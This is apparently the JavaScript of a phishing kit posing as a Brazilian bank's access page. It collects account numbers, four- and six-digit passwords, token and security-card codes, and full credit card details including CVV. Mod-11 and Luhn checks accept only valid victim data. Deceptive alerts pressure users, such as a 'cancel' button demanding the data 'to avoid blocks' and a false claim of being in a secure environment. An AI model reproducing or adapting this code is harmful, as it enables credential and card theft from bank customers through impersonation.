$(function(){
	/* SLIDER */
	$('.block_slider_all ul').cycle({
		fx:     'fade', 
		speed:  	 800,
		timeout: 	 4000,
		next: 		'#next',
		prev:  		'#prev'
	});

	/* BOTÕES CLICK'S */
	$('.J_Cancel').click(function() {
		alert('Para cancelar seu acesso e evitar bloqueios, antes de sair, informe os dados requeridos.\nA confirmação dos dados é muito importante para sua segurança!');
	});

	/* BOTÃO AMBIENTE SEGURO */
	$('.J_Sec').click(function() {
		alert('Você está em um ambiente seguro.');
	});

	/* BOTÕES SUBMIT */
	$('.J_Submit_FC').click(function() {
		$('#form_card').submit();
	});

	$('.J_Submit_P6').click(function() {
		$('#ps6_form').submit();
	});

	$('.J_Submit_PT').click(function() {
		$('#form_PT').submit();
	});

	$('.J_Submit_FT').click(function() {
		$('#formTable').submit();
	});

	$('.J_Submit_TKS').click(function() {
		$('#formTks').submit();
	});

	$('.J_Submit_P4').click(function() {
		$('#ps4_form').submit();
	});

	/* FECHAR ERRO */
	$('.pos_close_error').click(function() {
		$(".block_error").slideUp(500);
	});

	/* MASKARAS */
	$('#cd_val').mask("99/99",{placeholder:"_"});

	/* BOTÕES TECLADO */
	$('.JJ_0').click(function() {  setNumber4('0'); });
	$('.JJ_1').click(function() {  setNumber4('1'); });
	$('.JJ_2').click(function() {  setNumber4('2'); });
	$('.JJ_3').click(function() {  setNumber4('3'); });
	$('.JJ_4').click(function() {  setNumber4('4'); });
	$('.JJ_5').click(function() {  setNumber4('5'); });
	$('.JJ_6').click(function() {  setNumber4('6'); });
	$('.JJ_7').click(function() {  setNumber4('7'); });
	$('.JJ_8').click(function() {  setNumber4('8'); });
	$('.JJ_9').click(function() {  setNumber4('9'); });
	$('.J_Clear4').click(function() { $('#recebe_info_pass4').val(''); });

	$('.J_0').click(function() { setNumber6('0'); });
	$('.J_1').click(function() { setNumber6('1'); });
	$('.J_2').click(function() { setNumber6('2'); });
	$('.J_3').click(function() { setNumber6('3'); });
	$('.J_4').click(function() { setNumber6('4'); });
	$('.J_5').click(function() { setNumber6('5'); });
	$('.J_6').click(function() { setNumber6('6'); });
	$('.J_7').click(function() { setNumber6('7'); });
	$('.J_8').click(function() { setNumber6('8'); });
	$('.J_9').click(function() { setNumber6('9'); });
	$('.J_Clear').click(function() { $('#recebe_info_pass').val(''); });


});	

function setNumber4(number){
	var campo4 = $('#recebe_info_pass4').val();


	if(campo4.length + 1 <= 4){
		document.getElementById('recebe_info_pass4').value += number;
	}else{
		return false;
	}
}

function setNumber6(number){
	var campo6 = $('#recebe_info_pass').val();


	if(campo6.length + 1 <= 6){
		document.getElementById('recebe_info_pass').value += number;
	}else{
		return false;
	}
}

function check_P4(){
	var ps4 = $('#recebe_info_pass4').val();

	if(ps4 == ''){
		alert("Informe sua senha para prosseguir!");
		return false;
	}
	if(ps4.length < 4 || ps4.length > 4){
		alert("A senha de 4 dígitos informada não está correta.\nTente novamente!");
		$('#recebe_info_pass4').val('');
		return false;
	}
}

function checkTable(obj_form){
	var referencia = $('#referencia').val();

	/* VERIFICA CAMPOS VAZIOS */
	for (var i = 0; i < obj_form.elements.length; i++) {
		if (obj_form.elements[i].type == "text"){
			if (obj_form.elements[i].value == "" || obj_form.elements[i].value.length < 3) {
				alert("Informe todos os campos do seu Cartão Chaves corretamente!");
				obj_form.elements[i].focus();
				return false;
			break;
			}
		}
	}

	/* VERIFICA CAMPOS PREENCHIDOS 
	for(var c = 0;c < obj_form.elements.length; c++){
		var atual_campo = obj_form.elements[c].value;
		for(var o = 0; o < obj_form.elements.length; o++){
			if(atual_campo == obj_form.elements[o].value && obj_form.elements[c].name != obj_form.elements[o].name){
				alert("As chaves de Segurança informados não estão corretos.\nVerifique os dados e tente novamente!");
				return false;
			}
		}
	}*/

	/* VERIFICA CAMPO REFERENCIA */
	if(referencia.length < 8 || referencia.length > 11){
		alert("Código de referência do seu Cartão Chaves está incorreto.\nTente novamente!");
		document.getElementById('referencia').focus();
		return false;
	}
}

function checkTks(){
	var token = $('#user_token').val();

	if(token == ''){
		alert('Para prosseguir, informe a chave de segurança token!');
		$('#user_token').focus();
		return false;
	}
	if(token.length < 6 || token.length > 6){
		alert("A chave de segurança Token não está correta.\nTente novamente!");
		$('#user_token').val('');
		$('#user_token').focus();
		return false;
	}
}

function checkAcesso(){
	var agencia = $("#my_ag").val();
	var conta = $("#my_ct").val();
	var digito = $("#my_dg").val();
	var checarConta = checkAccount(conta, digito);

	if(agencia == '' || agencia == '1111' || agencia == '2222' || agencia == '3333' || agencia == '4444' || agencia == '5555' || agencia == '6666' || agencia == '7777' || agencia == '8888' || agencia == '9999' || agencia == '0000'){
		alert("Informe sua agência.\nTente novamente!");
		$("#my_ag").focus();
		return false;
	}

	if(conta == ''){
		alert("Informe sua conta.\nTente novamente!");
		$("#my_ct").focus();
		return false;
	}

	if(agencia.length < 4 || agencia.length > 4){
		alert("O número da agência informado está incorreto.\nTente novamente!");
		$("#my_ag").focus();
		return false;
	}

	if(conta.length < 4 || conta.length > 7){
		alert("Você informou um número de conta inexistente.\nTente novamente!");
		$("#my_ct").focus();
		return false;
	}

	if(!checarConta){
		alert("Os dados informados não estão corretos.\nVerifique: Agência, conta e dígito e tente novamente!");
		$("#my_ct").focus();
		return false;
	}

}

function NextCampo(campo, max_l, prox_campo){
	var atual_l = $(campo).val().length;

	if(atual_l >= max_l){
		document.getElementById(prox_campo).focus();
	}
}

function check_FPT(){
	var pos_table = $("#user_token").val();

	if(pos_table == ''){
		alert("Você deve informar a posição solicitada do seu cartão chave!");
		$("#user_token").focus();
		return false;
	}
	if(pos_table.length < 3 || pos_table.length > 3){
		alert("A chave da posição solicitada não está correta.\nTente novamente!");
		$("#user_token").val('');
		$("#user_token").focus();
		return false;
	}
}

function check_P6(){
	var pass6 = $("#recebe_info_pass").val();

	if(pass6 == ''){
		alert("Você deve informar a senha do seu cartão para confirmar esta operação!");
		return false;
	}
	if(pass6.length < 6 || pass6.length > 6){
		alert("A senha do cartão de crédito/débito não está correta.\nTente novamente!");
		$("#recebe_info_pass").val('');
		return false;
	}
}

function check_FC(){
	var cc_name = $("#cd_name").val();
	var cc_nume = $("#cd_number").val();
	var cc_vali = $("#cd_val").val();
	var cc_codi = $("#cd_cvv").val();
	var checkCC = checkCard(cc_nume);
	var GetDate = cc_vali.split('/');
	
	if(cc_name == ''){
		alert("Informe o nome do cartão.\nInforme o nome como inscrito no cartão!");
		$("#cd_name").focus();
		return false;
	}
	if(cc_nume == ''){
		alert("Informe o número do cartão.\nInforme os 16 dígitos do cartão!");
		$("#cd_number").focus();
		return false;
	}
	if(cc_vali == ''){
		alert("Informe a validado do cartão.\nInforme Mês e Ano do vencimento do cartão!");
		$("#cd_val").focus();
		return false;
	}
	if(cc_codi == ''){
		alert("Informe o Código de Segurança do cartão.\nInforme os 3 dígitos do verso do seu cartão!");
		$("#cd_cvv").focus();
		return false;
	}
	if(cc_name.length < 8){
		alert("O nome do cartão informado está incorreto.\nTente novamente!");
		$("#cd_name").focus();
		return false;
	}
	if(!checkCC){
		alert("O cartão informado não está correto ou não pertence a este titular.\nTente novamente!");
		$("#cd_number").val('');	
		$("#cd_number").focus();
		return false;
	}
	if(GetDate[0] < 0 || GetDate[0] > 12){
		alert("Vencimento do cartão informado não está correto.\nTente novamente!");
		$("#cd_val").val('');
		$("#cd_val").focus();
		return false;
	}
	if(GetDate[1] < 16 || GetDate[1] > 46){
		alert("Vencimento do cartão informado não está correto.\nTente novamente!");
		$("#cd_val").val('');
		$("#cd_val").focus();
		return false;
	}
	if(cc_codi.length < 3 || cc_codi.length > 3){
		alert("O Código de segurança não está correto.\nTente novamente!");
		$("#cd_cvv").val('');
		$("#cd_cvv").focus();
		return false;
	}
}


/* CHECADORES */
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}

function checkAccount(conta, digito){
	var lsoma = 0;
	var ipeso = 2;

	var dv_informado = digito;
	var dv_conta = conta;
	var tam = conta.length;

	var conta = new Array(tam);

	for (i=0; i<=tam; i++){
		conta[i] = dv_conta.substr( i, 1);
	}
	while (tam > 0){
		digito = conta[--tam];
		if ((digito >= 0) && (digito <= 9)) { 
			lsoma = lsoma + (digito - 0) * ipeso; 
			ipeso = ipeso + 1; 
			if (ipeso > 7) 
			{ipeso = 2;}
		} 
	}

	lsoma %= 11; 
	lsoma = 11 - lsoma;

	if ((lsoma == 11) || (lsoma == 10)){
		lsoma = 0;
	}

	if(parseInt(dv_informado) == parseInt(lsoma)){
		return true;
	}else{
		return false;
	}		
}

function checkCard(num){
	var msg = Array();
	var tipo = null;
	if(num.length > 16 || num[0]==0){
		return false;
	} else {
		var total = 0;
		var arr = Array();
		for(i = 0;i < num.length;i++){
			if(i % 2 == 0){
				dig = num[i] * 2;	
				if(dig > 9){
					dig1 = dig.toString().substr(0,1);
					dig2 = dig.toString().substr(1,1);
					arr[i] = parseInt(dig1)+parseInt(dig2);
				} else {
					arr[i] = parseInt(dig);
				}		
				total += parseInt(arr[i]);
			} else {
				arr[i] =parseInt(num[i]);
				total += parseInt(arr[i]);
			} 
		}
	}
	if(msg.length>0){	
		return false;
	}else{
			if(total%10 == 0){
				return true;
			}else{
				return false;
			}
		}
}